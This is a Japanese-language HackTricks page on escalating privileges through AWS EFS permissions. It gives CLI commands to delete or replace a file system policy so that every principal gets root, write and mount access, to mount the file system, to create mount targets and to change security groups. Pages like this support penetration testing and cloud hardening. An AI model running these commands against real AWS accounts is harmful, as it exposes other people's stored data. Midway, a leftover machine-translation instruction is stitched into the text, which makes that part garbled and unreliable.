# AWS - EFS Privesc

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)でAWSハッキングをゼロからヒーローまで学ぶ</strong></summary>

HackTricksをサポートする他の方法:

* **HackTricksにあなたの会社を広告したい**、または**HackTricksをPDFでダウンロードしたい**場合は、[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式PEASS & HackTricksグッズ**](https://peass.creator-spring.com)を入手する
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクションをチェックする
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)に**参加する**か、[**テレグラムグループ**](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)で**フォロー**する。
* [**HackTricks**](https://github.com/carlospolop/hacktricks)と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のgithubリポジトリにPRを提出して、あなたのハッキングのコツを**共有する**。

</details>

## EFS

EFSについての**詳細情報**はこちら:

{% content-ref url="../aws-services/aws-efs-enum.md" %}
[aws-efs-enum.md](../aws-services/aws-efs-enum.md)
{% endcontent-ref %}

EFSをマウントするには、EFSが公開されているサブネットワークにいて、それにアクセスする権限（セキュリティグループ）が必要であることを覚えておいてください。これが可能な場合、デフォルトでは常にマウントできますが、IAMポリシーによって保護されている場合は、ここで言及されている追加の権限が必要です。

### `elasticfilesystem:DeleteFileSystemPolicy`|`elasticfilesystem:PutFileSystemPolicy`

これらの権限のいずれかを持っている攻撃者は、**ファイルシステムポリシーを変更して**アクセスを**許可する**ことができますし、単に**削除して**デフォルトのアクセスを**許可する**こともできます。

ポリシーを削除するには：
```bash
aws efs delete-file-system-policy \
--file-system-id <value>
```
変更するには：
```json
aws efs put-file-system-policy --file-system-id <fs-id> --policy file:///tmp/policy.json

// Give everyone trying to mount it read, write and root access
// policy.json:
{
"Version": "2012-10-17",
"Id": "efs-policy-wizard-059944c6-35e7-4ba0-8e40-6f05302d5763",
"Statement": [
{
"Sid": "efs-statement-2161b2bd-7c59-49d7-9fee-6ea8903e6603",
"Effect": "Allow",
"Principal": {
"AWS": "*"
},
"Action": [
"elasticfilesystem:ClientRootAccess",
"elasticfilesystem:ClientWrite",
"elasticfilesystem:ClientMount"
],
"Condition": {
"Bool": {
"elasticfilesystem:AccessedViaMountTarget": "true"
}
}
}
]
}
```
### `elasticfilesystem:ClientMount|(elasticfilesystem:ClientRootAccess)|(elasticfilesystem:ClientWrite)`

この権限を持つ攻撃者は**EFSをマウント**することができます。EFSをマウントできる全員にデフォルトで書き込み権限が与えられていない場合、攻撃者は**読み取りアクセス**のみを持ちます。
```bash
sudo mkdir /efs
sudo mount -t efs -o tls,iam  <file-system-id/EFS DNS name>:/ /efs/
```
以下のテキストは、ハッキング技術に関する本の内容です。関連する英語テキストを日本語に翻訳し、同じマークダウンおよびHTML構文を保持して翻訳を返してください。コード、ハッキング技術名、ハッキング用語、クラウド/SaaSプラットフォーム名（Workspace、aws、gcpなど）、'leak'という単語、ペネトレーションテスト、およびマークダウンタグなどは翻訳しないでください。また、翻訳とマークダウン構文以外の余分なものは追加しないでください。

---

追加の権限`elasticfilesystem:ClientRootAccess`と`elasticfilesystem:ClientWrite`は、ファイルシステムがマウントされた後にそのファイルシステム内で**書き込む**ため、また**rootとしてアクセスする**ために使用できます。

**潜在的な影響：** ファイルシステム内の機密情報を見つけることによる間接的な権限昇格。

### `elasticfilesystem:CreateMountTarget`

攻撃者がEFSの**マウントターゲットが存在しない** **サブネットワーク**内にいる場合、この権限を持っていれば、自分のサブネット内に簡単に**新しいマウントターゲットを作成できます**。
```bash
# You need to indicate security groups that will grant the user access to port 2049
aws efs create-mount-target --file-system-id <fs-id> \
--subnet-id <value> \
--security-groups <value>
```
**潜在的影響：** ファイルシステム内で機密情報を見つけることによる間接的な権限昇格。

### `elasticfilesystem:ModifyMountTargetSecurityGroups`

攻撃者がEFSが自分のサブネットワーク内にマウントターゲットを持っているが、**トラフィックを許可するセキュリティグループがない**ことを発見した場合、選択されたセキュリティグループを**変更することでそれを変える**ことができます：
```bash
aws efs modify-mount-target-security-groups \
--mount-target-id <value> \
--security-groups <value>
```
**潜在的な影響：** ファイルシステム内の機密情報を見つけることによる間接的な権限昇格。



<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)でAWSハッキングをゼロからヒーローまで学ぶ</strong></summary>

HackTricksをサポートする他の方法：

* **HackTricksにあなたの会社を広告したい**、または**HackTricksをPDFでダウンロードしたい**場合は、[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式PEASS & HackTricksグッズ**](https://peass.creator-spring.com)を入手する
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクションをチェックする
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)に**参加する**か、[**テレグラムグループ**](https://t.me/peass)に参加する、または**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)を**フォローする**。
* [**HackTricks**](https://github.com/carlospolop/hacktricks)と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のgithubリポジトリにPRを提出して、あなたのハッキングのコツを共有する。

</details>
